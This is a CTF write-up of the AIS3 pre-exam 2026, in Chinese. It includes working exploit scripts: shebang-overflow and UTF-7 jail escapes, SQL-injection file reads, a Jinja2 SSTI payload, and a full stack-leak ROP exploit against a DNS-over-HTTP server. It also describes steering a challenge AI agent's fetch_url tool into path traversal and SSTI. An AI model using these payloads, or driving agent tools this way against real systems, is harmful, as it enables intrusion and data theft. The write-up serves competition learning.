---
title: pre-exam 2026 Writeup
date: 2026-05-18 03:45:00
categories:
  - 競賽
  - CTF
tags:
  - writeup
  - note
  - CTF
  - web
photos:
  - /img/AIS3_logo.png
description: |-
  無義的征伐 不之疲倦的神明
  不願死去 迂腐不堪 
---


pre-exam 2026 Writeup
===

[TOC]

真的很好奇那些針對AI的題目到底是什麼思路 有機會採訪一下
~~這或許能讓我在AI的研究上有一大進步~~(
![螢幕擷取畫面 2026-05-18 170429](https://hackmd.io/_uploads/rks0_NHezg.png)

## Welcome
點開連結後有一直變動的QRCore 截圖後使用手機掃跳轉到一[網址](https://qrss.netlify.app/scan)可以通過掃描不斷變動QR碼的方式來接收檔案 這跟我朋友做的私密通訊軟體加好友的方式很像
得到一有flag的圖片
![螢幕擷取畫面 2026-05-18 123153](https://hackmd.io/_uploads/Skgvw4reze.png)

`ais3{hello_llm_welcome to_pre exam 2026!}`
## Jail
Linux 核心解析 shebang 時，有個 buffer 上限（通常是 128 bytes）。如果 shebang 行超過這個長度：

execve() 回傳 ENOEXEC（不是 ENOENT）
Shell 收到 ENOEXEC → fallback 當作 shell script 執行
第一行 shebang 被當作 shell 的 # 註解忽略
後面的 cat /flag 就直接跑了
`AIS3{5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!}`
```py
import requests, uuid

for n in [230, 240, 250, 260, 270, 300, 400]:
    u = str(uuid.uuid4())
    payload = "A" * n + "\necho " + str(n)
    r = requests.post(f"http://chals1.ais3.org:10001/{u}", data=payload)
    print(f"n={n}: {repr(r.text)}")
```
## Jail Revenge
Jail的延伸題添加新的限制：`len(d.split("\n")[0]) < 50`，第一行不能超過 50 字
可以透過編碼的方式繞過
```python
import requests, uuid

u = str(uuid.uuid4())

# 第一行：讓 shebang 變成 #!/usr/local/bin/python3 -Xcoding=utf-7
# 第二行：UTF-7 編碼的 print(open("/flag").read())
payload = " -Xcoding=utf-7\nprint+ACg-open+ACg-\"/flag\"+ACk-+AC4-read+ACg-+ACk-+ACk-"

r = requests.post(
    f"http://chals1.ais3.org:10002/{u}",
    data=payload.encode()
)

print(r.text)
```
flag ``AIS3{D3MN_21P_PYD0C_A5_-_-MA1N-_-_D07_PY}``
## MyGO!!!!! X Ave Mujica 圖庫
首先查看 `robots.txt`
內容只有 .svn，不是標準 robots.txt 格式，這是出題者給的 hint：SVN 原始碼洩漏
在 HTML 的 JavaScript 中發現圖片是透過以下方式載入：
```htmlembedded
javascriptcard.innerHTML = `<img class="card-img" src="/image?id=${item}"/>`;
```
以及上傳後端：
```javascript
javascriptconst res = await fetch("/upload", { method: "POST", body: formData });
```
漏洞發現
```
SQL Injection 在 /image?id=
```
嘗試傳入單引號：
```bash
bashcurl "http://chals1.ais3.org:48763/image?id=1'"
```
回應 `500 Internal Server Error`，代表 SQL 語句被 ' 打斷，確認 SQL Injection 漏洞存在
用 SQLi 讀取 `.svn/wc.db`
使用 UNION SELECT 讓 query 回傳 ``.svn/wc.db`` 作為 path：
```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'.svn/wc.db'--" \
  --output wc.db
file wc.db
```
.svn/wc.db 是 SQLite 資料庫，其中 NODES 表格記錄了所有 SVN 追蹤的檔案路徑與其內容的 SHA1 checksum：
```bash
sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES WHERE checksum IS NOT NULL;"
```
輸出：
```
app.py|$sha1$5f9a415989d540e61aa799b0986b661783e5a638
images/good.jpg|$sha1$2d3df0b64eb818e5a5d47aa15d1e2c0a1c32e67e
images/haruhikage.jpg|$sha1$9493a2358b0e531023a4539aef1d72f7a508ead1
images/useless.jpg|$sha1$00dc00b3fd47f1b039b14e6f6717cc41bb4a8723
images/yes_but_no.jpg|$sha1$916b48d50f247310c10aff06ab35f2128800c1e7
requirements.txt|$sha1$e8439a6b8f01e74d2dfc52eba0604d8c6885c834
robots.txt|$sha1$5f5cf0cfbb92e0bd307763ab10bd6f9da2770c53
static/style.css|$sha1$b1f0b95ae51d8c3e152cca3689f611afa0354e9f
super_secret_starburst_flag114514.txt|$sha1$38b96d193f20bfafaed25e54ac4c9f3e35607424
templates/index.html|$sha1$db75b7877abf40a52f7fe041da049c426839719e
```
發現 super_secret_starburst_flag114514.txt
嘗試讀取 SVN pristine 版本
SVN 把 commit 時的檔案內容存放在 ``.svn/pristine/<sha1前兩碼>/<sha1>.svn-base``，嘗試用此路徑讀取 flag：
```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'.svn/pristine/38/38b96d193f20bfafa
ed25e54ac4c9f3e35607424.svn-base'--"
```
得到：
`AIS3{BangDream_AveMujica_Exitus_at_Taipei_8/8_and_I_don't_have_ticket}`
交題後發現不正確
改讀 live 檔案
``.svn/pristine/``存放的是 SVN commit 時的快照。如果開發者在最後一次 commit 之後又修改了檔案但沒有重新 commit，pristine 裡的就是舊版本。
直接讓 Flask 的 `send_file()` 讀取伺服器當前的 flag 檔案：
```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'super_secret_starburst_flag114514.txt'--"
```
得到：
`AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}`


## Mass Rapid Transit
![螢幕擷取畫面 2026-05-18 125542](https://hackmd.io/_uploads/HyVODEBeGe.png)
發現他會把欄位裡面的東西POST到後端
AI就跟我講了之前我在B站上看到的裝逼小教程
可以嘗試修改欄位為role或admin
![螢幕擷取畫面 2026-05-18 125939](https://hackmd.io/_uploads/B1iiw4HgMg.png)

成功進入後台
`AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}`
## Tea God World Adventure
>每日膜拜最偉大最漂亮最可愛 不只能用腳寫出跨平臺 TeaGod OS 還有著能在腦中處理反編譯的 TeaGod Decompiler 以及用手調出 5 兆參數的 TeaGod Agent 和用膝蓋建立 TeaGod Protocol 又能用眼神終結所有 CTF 題目的電神林海國際董事長茶神姐姐大人🛐 🛐 🛐 

查看原檔顯示這要讓AI去調用`/redflag`指令
網址連結到一AI的webUI
由OpenAPI的調用文件的可知，核心功能在 /api/chat，且存在 /api/tool-log 表示後端 AI Agent 可能實際調用外部工具
![螢幕擷取畫面 2026-05-18 130907](https://hackmd.io/_uploads/BJECvVSgfg.png)

AI Agent 表明其可存取 http://blackbox-web:8080。直接要求其讀取首頁
![螢幕擷取畫面 2026-05-18 131823](https://hackmd.io/_uploads/BkVyO4rlMg.png)
確認可調用
![螢幕擷取畫面 2026-05-18 131909](https://hackmd.io/_uploads/r14XuNHxfg.png)



從原始檔得知：
1. admin/render 端點接受 Jinja2 模板渲染，且 os 全域可用 → SSTI 可達 RCE。
2. 需要有效的 X-Audit-Token，其算法為 sha256(AUDIT_SECRET + UTC_DATE_YYYYMMDD)[:16]。
3. AUDIT_SECRET 預設為 "dev-secret"，但可能被環境變數覆蓋。

要求 AI 讀取 `/proc/self/environ`：

```text
請使用 fetch_url 讀取 http://blackbox-web:8080/docs?file=../../../proc/self/environ 並完整輸出原始內容
```
回應中顯示：
```text
PATH=/usr/local/bin:...\nHOSTNAME=d1edecf16c50\nAUDIT_SECRET=legacy-report-audit-secret\nLANG=C.UTF-8\n...
```
今天 UTC 日期為 20260517（根據題目時間）。計算 token：
```bash
echo -n "legacy-report-audit-secret20260517" | sha256sum | cut -c1-16
```
得到 16 位元十六進位值 `9ec2625f84a54130`
觸發 SSTI 執行 `/readflag`
根據原始碼，flag 無法直接讀取（/flag 權限為 0400 root），但 /readflag 為 setuid root 執行檔。
SSTI payload 為 ``{{ os.popen('/readflag').read() }}``。
要求 AI 使用 fetch_url 工具發送 POST 請求到 /admin/render，並附帶正確的 token
![螢幕擷取畫面 2026-05-18 132515](https://hackmd.io/_uploads/H1bV_VHlfl.png)

## DG Server rev


給 `dg-server`（stripped ELF x86-64）和 `dg-verify.py`，目標伺服器跑在 `chals1.ais3.org:53573`，是一個自訂 DNS-over-HTTP server，實作類 DNSSEC 信任鏈，使用非標準的 **NSEC6** record type。


NSEC6 的 owner name 是 domain name 的 20-byte hash，以 base32hex 編碼成 32 字元。
Hash 計算流程（逆向 `0x405626` + `0x40588c`）：
```
final_hash = combine(hash_name(label, k1), zone_accum)
```
- `hash_name`：用字元逐一混入 hash 狀態，再展開成 20 bytes
- `combine`：兩個 20-byte buffer 的大端 byte-wise addition with carry
- `k1`（salt，20 bytes）：由 zone 的 RRSIG 資料衍生的 PRNG 輸出

關鍵弱點：`curious.sleeping.` 的 `k1` 全部為 `0xff`

這使 `hash_name` 的 salt 項固定，整個 hash 函數可逆

NSEC6 和 NSEC3 原理相同：查詢不存在的名稱會回傳覆蓋該 hash 空間的 NSEC6 record，藉此遍歷整個 zone。
```python
import socket, urllib.parse

def q(host, port, name, rrtype):
    path = f"/dns-query?name={urllib.parse.quote(name)}&type={rrtype}"
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Accept: application/dns-json\r\nConnection: close\r\n\r\n").encode()
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(req)
        data = b""
        while chunk := s.recv(4096): data += chunk
    return data.split(b"\r\n\r\n", 1)[-1].decode(errors="replace")
```
遍歷 `curious.sleeping.` 後得到完整的 9 個節點 circular chain：

`S6NPJID2...` 的 bytes 0–8 與其他 hash 完全不同，是因為 byte-wise addition 的進位溢出到高位元組，代表這個名稱的 hash 值極大。

已知 `k1 = b'\xff' * 20` 和 `zone_accum`（從 RRSIG 資料計算），對 `S6NPJID2K4SNE7AB754D34I8IK3E8TKJ` 逆向：
1. base32hex decode → 20 bytes
2. 逆 `combine`（減去 `zone_accum`）→ `hash_name` 的輸出
3. 逆 PRNG 展開 → name 混入後的 hash 狀態
4. 逐字元逆推 → 原始 label
得到：`azft0azxct7utcyw`

```python
print(q("chals1.ais3.org", 53573, "azft0azxct7utcyw.curious.sleeping.", "TXT"))
```
`AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}`
## tetris，簡單
**原始分析結果：**

這個 binary 是一個混淆嚴重的靜態連結 Tetris 遊戲，主要發現：

**架構：**
- `.text` section：100,000 個 state 函數（每個 state 對應一個遊戲局面決策）
- `.data` section（VA `0x1aa6130`）：28-byte ciphertext
- `.bss` section（VA `0x1aa8a60`）：24-byte key buffer（執行期計算）

**Key 產生流程：**
1. 主函數先呼叫 `func(rdi=piece_data@rodata, rsi=output_buf@bss)`
2. 該函數用 **FNV-1a 雜湊**（seed=`0x811c9dc5`，prime=`0x1000193`）對 **4×10 board** 上的棋盤狀態做 hash
3. 最後 24 次迭代把 hash 的各個位元組存入 key buffer

**加解密：**
- RC4，標準 256-iter KSA
- Key（24 bytes）= `6331e236bf039b33dbccc331b738250653b2e011af672927`
- Ciphertext（28 bytes）= `2ea556460d7c8edc836f3083fff8a55cd076d8cd99dc3f399d657064`
- Flag = `AIS3{T3tr1s_P4tt3rn_M4st3r!}`
## ㄌㄨㄚˋ

檔案：
- `luac_stripped.exe`
- `secret.luac`
Lua 程式不一定是人類能直接看的文字檔，也可能先被編譯成 bytecode。 
bytecode 可以想像成「給機器看的指令小卡」，不是給人看的原始碼。
把檔案前幾個 byte 看一下
```text
1B 4C 75 61 51
```
這代表它是 Lua 5.1 bytecode：
- `1B 4C 75 61` 就是 `.Lua`
- `51` 代表版本 `0x51`，也就是 Lua 5.1
所以我們知道，這題不是一般 Windows exe 的逆向而已，還有 Lua VM 的題目味道。
如果這份 `.luac` 是正常 Lua 5.1，我們本來可以：
1. 直接用 `luac -l` 列出指令
2. 或者用 decompiler 還原大致邏輯
但他把 opcode 對應表打亂了 所以一般工具會把指令看錯
執行：

```text
luac_stripped.exe -l -l secret.luac
```
會得到一句提示：
```text
This compiler has been disabled for the CTF challenge.
Reverse engineer this binary to discover the OpCode mapping!
```

正常 Lua 5.1 會把 opcode 直接存在指令最低 6 bits。 

這題每個 Lua function prototype 都多了一個 byte，位置在：
- `nups` 後面
- `numparams` 前面
我們把這個 byte 叫做 `seed`。
這個 `seed` 會配合目前指令位置 `pc`，把 opcode 再混淆一次。
還原公式是：

```python
real_opcode = (encoded_instruction ^ (seed ^ 0x2B) ^ (15 * pc + 0x11)) & 0x3F
```

重點在 `luac_stripped.exe` 裡的符號沒有真的全消失。  
裡面還看得到像這些名字：

- `luaK_code`
- `luaK_codeABC`
- `luaV_execute`
- `luaP_opmodes`
- `luaP_opnames`

它在把一條 Lua 指令寫進 bytecode 陣列時，做了下面這件事：

1. 先算出這條指令在 proto 裡是第幾條
2. 再拿 `proto->seed`
3. 再用 `0x2B`
4. 再用 `15 * pc + 0x11`
5. 把 opcode 的低 6 bits 做 XOR

把混淆解掉之後，主程式大意如下：

```lua
f0 = closure(P0)
f1 = closure(P1)
f2 = closure(P2)
f3 = closure(P3)
f4 = closure(P4)
f5 = closure(P5)

io.write("> ")
input = io.read() or ""

if f5(input) then
    print("ok")
else
    print("no")
end
```

這表示：

- `P5` 是最後的驗證函式
- `P0 ~ P4` 都是在幫 `P5` 做準備

所以我們只要把 `P0 ~ P5` 搞懂，flag 就能推出來。

`P0(a, b)` 不是普通加法減法，它是在自己做 bitwise XOR。
也就是最基本的 XOR 規則

而`P1(table, a, b, c)` 會對每個位置做：

```text
(value - a - ((index * b) % c)) % 256
```

像是在每個格子都扣掉一點東西，而且扣掉多少跟位置有關。

`P2(left, right)` 的規則很簡單：

- 第 1 格放 `left`
- 第 2 格放 `right`
- 第 3 格放 `left`
- 第 4 格放 `right`

做出 key stream

`P3` 先建立兩個表：

```text
[83, 102, 79, 57, 207, 142]
[140, 252, 144, 116, 68]
```

先交錯，再丟進 `P1( ..., 51, 9, 17 )`。

最後得到：

```text
[23, 88, 41, 199, 17, 90, 250, 61, 143, 12, 77]
```



`P4` 也是一樣套路：

1. 先放兩個常數表
2. 用 `P2` 交錯
3. 用 `P1( ..., 17, 11, 23 )` 平移

最後得到的目標表是：

```text
[158, 35, 172, 11, 160, 217, 123, 62, 248, 242, 88, 51, 84, 125, 92, 152, 46, 62, 166, 147, 23, 73, 80, 220, 153, 6, 67, 13, 195, 5, 91, 6, 32]
```
P5是最重要的函式

它做的事如下：

1. 先呼叫兩個 helper，做出 `key_stream` 和 `target_table`
2. 檢查 `#input` 是不是等於 `#target_table`
3. 如果不是，直接回傳 `false`
4. 把初始狀態設成 `state = 65`
5. 從第 1 個字元一路檢查到最後一個字元

這裡的 `65` 不是字串長度。  
它是初始狀態 `state = 65`，也就是字元 `'A'` 的 ASCII。

而 `target_table` 有 33 個數字，所以 flag 長度就是 33。

每一輪大概做這些事：

```text
key = key_stream[(i * 5 + state) % len(key_stream)]
extra = xor(key, i) % 13
helper = (key + i * 7) % 256
test = (xor((char + i + state) % 256, helper) + extra) % 256
```

如果 `test != target_table[i]`，就立刻失敗。  
如果相等，就更新 `state`：

```text
state = (state + test + key + i * 3) % 256
```
原本：

```text
test = (xor((char + i + state) % 256, helper) + extra) % 256
```

而且我們知道 `test = target_table[i]`。  
所以可以改寫成：

```text
mixed = (target_table[i] - extra) % 256
left_side = xor(mixed, helper)
char = (left_side - i - state) % 256
```

這樣每一輪的字元就直接被算出來了。

也就是說，這題不是猜答案，而是把鎖的結構看懂之後，直接把鑰匙畫出來。

讓AI照著上面的反推公式寫出腳本
```python
def bxor_slow(a, b):
    """Mirror the Lua function in proto P0.

    The challenge did not use Lua 5.3 bitwise operators. Instead it built XOR
    by hand: compare every bit, and keep the bit when they differ.
    """
    result = 0
    bit = 1
    while a > 0 or b > 0:
        if (a % 2) != (b % 2):
            result += bit
        a //= 2
        b //= 2
        bit *= 2
    return result


def shift_table(values, add_a, add_b, mod_c):
    """Mirror proto P1.

    For each position i (starting from 1), compute:
        (values[i] - add_a - ((i * add_b) % mod_c)) % 256
    """
    out = []
    for index, value in enumerate(values, start=1):
        moved = (value - add_a - ((index * add_b) % mod_c)) % 256
        out.append(moved)
    return out


def interleave(left, right):
    """Mirror proto P2.

    Odd positions take from left, even positions take from right.
    """
    out = []
    left_index = 0
    right_index = 0
    total = len(left) + len(right)
    for position in range(1, total + 1):
        if position % 2 == 1:
            out.append(left[left_index])
            left_index += 1
        else:
            out.append(right[right_index])
            right_index += 1
    return out


def build_key_stream():
    left = [83, 102, 79, 57, 207, 142]
    right = [140, 252, 144, 116, 68]
    mixed = interleave(left, right)
    return shift_table(mixed, 51, 9, 17)


def build_target_table():
    left = [186, 199, 186, 148, 16, 111, 106, 113, 66, 185, 41, 97, 192, 105, 232, 127, 67]
    right = [74, 49, 254, 98, 21, 85, 158, 184, 93, 177, 102, 248, 33, 39, 30, 30]
    mixed = interleave(left, right)
    return shift_table(mixed, 17, 11, 23)


def recover_flag():
    key_stream = build_key_stream()
    target = build_target_table()

    state = 65
    out = []

    for index, expected in enumerate(target, start=1):
        # Lua arrays start from 1. The original code used:
        #   key = key_stream[(index * 5 + state) % #key_stream + 1]
        # Python arrays start from 0, so the "+ 1" disappears here.
        key = key_stream[(index * 5 + state) % len(key_stream)]

        extra = bxor_slow(key, index) % 13
        mixed = (expected - extra) % 256
        helper = (key + index * 7) % 256

        # Forward check in Lua:
        #   test = (bxor_slow((char + index + state) % 256, helper) + extra) % 256
        # Reverse it here to recover char.
        left_side = bxor_slow(mixed, helper)
        char_value = (left_side - index - state) % 256
        out.append(char_value)

        test = (bxor_slow((char_value + index + state) % 256, helper) + extra) % 256
        assert test == expected

        state = (state + test + key + index * 3) % 256

    assert state == 229
    return bytes(out).decode("ascii")


def main():
    print(recover_flag())
```

flag`AIS3{Lu4_0pc0d3_Shuffl1ng_1s_Fun}`

## 哇!金色傳說
有一個硬編碼的 gacha 端點：http://chals1.ais3.org:50001。本地回退機制只會返回普通物品，所以我正在檢查協程，查看請求/回應字段，以及遠端路徑是否包含挑戰答案。

用戶端 POST 請求的 JSON 資料格式為 
```json
{"spend":...,"rate":...,"username":"...","gold":...,"score":...,"kills":...}
```
並信任伺服器的回應。
我打算直接使用合成值來查詢該端點，而不是透過遊戲取得金幣。
透過逆向工程 Unity Assembly-CSharp.dll 發現：GameManager 硬編碼了 http://chals1.ais3.org:50001，而 GachaServer POST 請求的數值由客戶端控制，包括 `spend/gold/score/kills/rate`。
發送合成的高數值後，伺服器回傳的 flag 就是盔甲名稱

`AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}`
## DG Server(pwn)

題目給了一個自架的 DNS-over-HTTPS (DoH) server binary `dg-server`，以及一支輔助腳本 `dg-verify.py`。
`dg-verify.py` 對 server 做類似 DNSSEC chain-of-trust 的 Ed25519 簽章驗證，並不是攻擊目標；
真正的洞在 `dg-server` 

```
python3 dg-verify.py @chals1.ais3.org:57573 www.curious.sleeping A
```

```
$ file dg-server
dg-server: ELF 64-bit LSB executable, x86-64, statically linked, stripped

$ checksec dg-server
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
正常的 DoH 請求格式：

```
GET /dns-query?name=www.curious.sleeping&type=A HTTP/1.1
```

`type=` 只接受 `A`、`NS`、`MX` 等合法 DNS record type。
丟入非法值時，server 回傳：

```json
{"Status":4,"Comment":"invalid query type","bad_type":"41414141..."}
```

`bad_type` 欄位把使用者輸入的 type 轉成 hex 字串回傳——這是後續 stack leak 的核心。
逆向 invalid type handler，關鍵邏輯還原如下：
```c
void handle_invalid_type(char *url_decoded_type, int sock_fd) {
    char     buf[0x40];    // rbp-0x40
    uint16_t dump_len;     // buffer offset 0x10

    // 前 16 bytes 過 toupper()
    for (int i = 0; i < 16; i++)
        buf[i] = toupper(url_decoded_type[i]);

    // 16 bytes 之後直接 memcpy——無長度檢查！
    memcpy(buf + 16, url_decoded_type + 16, strlen(url_decoded_type) - 16);

    // dump_len 控制 bad_type 回傳幾個 bytes
    hex_encode_and_send(buf, dump_len, sock_fd);
}
```
`memcpy` 無邊界，type 夠長就能蓋掉 canary / saved_rbp / saved_rip
`dump_len` 在 buffer offset 0x10（toupper zone 結束後的第一格），覆蓋它可讓 server dump 出任意長度的 stack
構造 payload：

```
type = 'A' * 16 + \xa0\x00
```

URL-encoded 送出：`AAAAAAAAAAAAAAAA%a0%00`

- 前 16 個 `'A'` 過 `toupper()` 無影響
- `buf[0x10]` 寫入 `0xa0`，`buf[0x11]` 寫入 `0x00`
- `dump_len` = little-endian `0x00a0` = **160**

Server 因此在 `bad_type` 回傳 160 bytes 的 stack hex，解析各偏移量：

```
buffer offset   size   content
0x38             8     stack canary
0x40             8     saved rbp
0x48             8     return address
0x5c             4     accepted socket fd（遠端 = 4）
```

```python
hex_dump  = bytes.fromhex(bad_type_field)
canary    = hex_dump[0x38:0x40]
saved_rbp = hex_dump[0x40:0x48]
sock_fd   = struct.unpack("<I", hex_dump[0x5c:0x60])[0]  # 4
```


Buffer 起點為 `rbp-0x40`，canary 在 `rbp-0x08` = buffer offset `0x38`：

```
buffer offset   content
0x00            'A' × 16          ← toupper zone
0x10            \x00 × 40         ← padding to canary
0x38            canary (8 bytes)  ← 填 Phase 1 洩漏的值
0x40            saved rbp         ← 維持原值
0x48            → ROP chain       ← 蓋掉 saved rip
```
Binary 是 statically linked 且 No PIE，所有位址固定。逆向確認：
```python
POP_RDI   = 0x69a383    # pop rdi ; ret
POP_RSI   = 0x46958e    # pop rsi ; ret
POP_RDX   = 0x4d5513    # pop rdx ; ret
SYS_READ  = 0x73f630    # glibc read()  → syscall NR=0
SYS_WRITE = 0x73f6f0    # glibc write() → syscall NR=1
SYS_OPEN  = 0x73f510    # glibc open()  → syscall NR=257 (openat w/ AT_FDCWD)
BSS       = 0x8f7000    # 可寫 .bss 空間
```

`open()` wrapper 內部使用 `openat(AT_FDCWD, path, flags)`，但 C-level calling convention 仍是 `open(rdi=path, rsi=flags, rdx=mode)`，ROP 直接呼叫即可。

```
read(sock_fd, BSS, 0x20)            ← 從 socket 讀進 "/flag.txt\x00"
open(BSS, O_RDONLY=0, 0)            ← 開檔
read(flag_fd, BSS+0x100, 0x100)     ← 讀 flag 內容進 buffer
write(sock_fd, BSS+0x100, 0x100)    ← 把 flag 送回 socket
```
照這個思路讓AI編寫Exploit 腳本

```python=
#!/usr/bin/env python3
import socket, re, struct

HOST = "chals1.ais3.org"
PORT = 57573

POP_RDI   = 0x69a383
POP_RSI   = 0x46958e
POP_RDX   = 0x4d5513
SYS_READ  = 0x73f630
SYS_WRITE = 0x73f6f0
SYS_OPEN  = 0x73f510
BSS       = 0x8f7000

def p64(x): return struct.pack("<Q", x)
def u64(b): return struct.unpack("<Q", b[:8])[0]
def u32(b): return struct.unpack("<I", b[:4])[0]
def url_encode(data): return "".join(f"%{b:02x}" for b in data)

def raw_get(host, port, path, keep_alive=False):
    s = socket.socket()
    s.settimeout(10)
    s.connect((host, port))
    conn = "keep-alive" if keep_alive else "close"
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Accept: application/dns-json\r\nConnection: {conn}\r\n\r\n").encode()
    s.sendall(req)
    if not keep_alive:
        data = b""
        s.settimeout(3)
        try:
            while True:
                d = s.recv(4096)
                if not d: break
                data += d
        except: pass
        s.close()
        return None, data
    s.settimeout(1)
    early = b""
    try: early = s.recv(4096)
    except: pass
    s.settimeout(5)
    return s, early

# ── Phase 1: Stack Leak ──────────────────────────────────────────────────────
_, resp = raw_get(HOST, PORT,
    "/dns-query?name=leak.test&type=AAAAAAAAAAAAAAAA%a0%00")

m      = re.search(rb'"bad_type"\s*:\s*"([0-9a-fA-F]+)"', resp)
leaked = bytes.fromhex(m.group(1).decode())

canary    = leaked[0x38:0x40]
saved_rbp = leaked[0x40:0x48]
sock_fd   = u32(leaked[0x5c:0x60])

print(f"[+] canary:    {u64(canary):#018x}")
print(f"[+] saved_rbp: {u64(saved_rbp):#018x}")
print(f"[+] sock_fd:   {sock_fd}")

# ── Phase 2: ROP Chain ───────────────────────────────────────────────────────
rop  = p64(POP_RDI) + p64(sock_fd)
rop += p64(POP_RSI) + p64(BSS)
rop += p64(POP_RDX) + p64(0x20)
rop += p64(SYS_READ)                    # read(sock_fd, bss, 0x20)

rop += p64(POP_RDI) + p64(BSS)
rop += p64(POP_RSI) + p64(0)
rop += p64(POP_RDX) + p64(0)
rop += p64(SYS_OPEN)                    # open(bss, O_RDONLY, 0)  → fd=3

rop += p64(POP_RDI) + p64(3)
rop += p64(POP_RSI) + p64(BSS + 0x100)
rop += p64(POP_RDX) + p64(0x100)
rop += p64(SYS_READ)                    # read(3, bss+0x100, 0x100)

rop += p64(POP_RDI) + p64(sock_fd)
rop += p64(POP_RSI) + p64(BSS + 0x100)
rop += p64(POP_RDX) + p64(0x100)
rop += p64(SYS_WRITE)                   # write(sock_fd, bss+0x100, 0x100)

payload  = b"\x41" * 16                 # toupper zone
payload += b"\x00" * (0x38 - 0x10)     # padding to canary
payload += canary
payload += saved_rbp
payload += rop

path = f"/dns-query?name=pwn.test&type={url_encode(payload)}"
s, _ = raw_get(HOST, PORT, path, keep_alive=True)

s.sendall(b"/flag.txt\x00" + b"\x00" * 23)   # for ROP's read()

s.settimeout(5)
flag_data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        flag_data += chunk
except: pass
s.close()

m = re.search(r"AIS3\{[^}]+\}", flag_data.decode(errors="replace"))
print(f"\n🎉 FLAG: {m.group(0)}" if m else f"raw: {flag_data[:200]}")
```
flag `AIS3{st4ck_l3ak_v14_b4d_typ3_dump_4nd_r0p_t0_r34d_fl4g}`